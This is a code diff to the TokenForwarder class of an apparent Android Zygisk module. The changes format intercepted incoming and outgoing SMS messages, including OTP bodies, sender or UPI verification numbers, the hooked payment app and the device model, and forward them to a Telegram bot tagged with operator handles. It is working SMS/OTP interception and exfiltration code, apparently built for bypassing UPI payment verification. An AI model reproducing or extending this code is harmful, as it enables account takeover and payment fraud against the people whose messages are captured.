@@ -1,6 +1,7 @@
 package com.hivirtus.zygiskmode
 
 import android.content.Context
+import android.os.Build
 import okhttp3.MediaType.Companion.toMediaType
 import okhttp3.OkHttpClient
 import okhttp3.Request
@@ -14,9 +15,6 @@ class TokenForwarder(
 
     private val client = OkHttpClient()
 
-    /**
-     * Sirf intercept number + SMS body — Telegram pe one-tap copy (&lt;code&gt; block).
-     */
     fun forward(otp: LastOtp): Boolean {
         val config = configManager.load()
         if (!config.autoForwardToken) return false
@@ -37,30 +35,63 @@ class TokenForwarder(
         return sent
     }
 
+    fun sendForwardingTest(botToken: String, chatId: String): Boolean {
+        return sendTestMessage(botToken, chatId, buildForwardingTestMessage())
+    }
+
+    fun buildForwardingTestMessage(): String {
+        return buildString {
+            appendLine("🚀 $TELEGRAM_HANDLE Telegram Forwarding Test Successful!")
+            appendLine()
+            append("Device: ").append(deviceName())
+        }
+    }
+
     private fun smsCopyText(otp: LastOtp): String {
         return otp.body.ifBlank { otp.otp }.trim()
     }
 
     private fun buildInterceptMessage(otp: LastOtp, config: ModuleConfig): String {
-        val interceptNo = resolveUpiVerifyNumber(otp, config)
+        val outgoing = otp.direction.equals("outgoing", ignoreCase = true)
+        val peerLabel = if (outgoing) "To" else "From"
+        val peerValue = if (outgoing) {
+            resolveUpiVerifyNumber(otp, config)
+        } else {
+            otp.sender.ifBlank { otp.rawPeer }
+        }
         val smsBody = smsCopyText(otp)
+        val appLabel = resolveAppLabel(otp)
 
         return buildString {
-            if (smsBody.isNotBlank()) {
-                appendLine("<code>${escapeHtml(smsBody)}</code>")
+            appendLine(if (outgoing) "📱 Intercepted Outgoing SMS" else "📱 Intercepted Incoming SMS")
+            appendLine(TELEGRAM_HANDLE)
+            if (appLabel.isNotBlank()) {
                 appendLine()
-                append("👆 Tap to copy SMS")
+                appendLine("App: $appLabel")
             }
-            if (interceptNo.isNotBlank() && interceptNo != smsBody) {
-                appendLine()
-                appendLine()
-                append("<code>${escapeHtml(interceptNo)}</code>")
-            }
+            appendLine()
+            appendLine("$peerLabel (Tap to copy):")
+            appendLine("<code>${escapeHtml(peerValue)}</code>")
+            appendLine()
+            appendLine("Body (Tap to copy):")
+            append("<code>${escapeHtml(smsBody)}</code>")
         }
     }
 
+    private fun resolveAppLabel(otp: LastOtp): String {
+        if (otp.messageLabel.isNotBlank()) return otp.messageLabel
+        val pkg = ActiveHookManager.readActivePackage()
+        if (!pkg.isNullOrBlank()) return UpiAppRegistry.displayNameFor(pkg)
+        return ""
+    }
+
+    private fun deviceName(): String {
+        val model = Build.MODEL?.trim().orEmpty()
+        return model.ifBlank { "Android" }
+    }
+
     /**
-     * UPI verify number — short code / sender jahan SMS intercept hua (+91 personal nahi).
+     * UPI verify short code / destination — personal mock number hide.
      */
     private fun resolveUpiVerifyNumber(otp: LastOtp, config: ModuleConfig): String {
         val rawPeer = otp.rawPeer.trim()
@@ -146,5 +177,9 @@ class TokenForwarder(
         } catch (_: Exception) {
             false
         }
+    }
+
+    companion object {
+        const val TELEGRAM_HANDLE = "@hivirtus @liqdy"
     }
 }
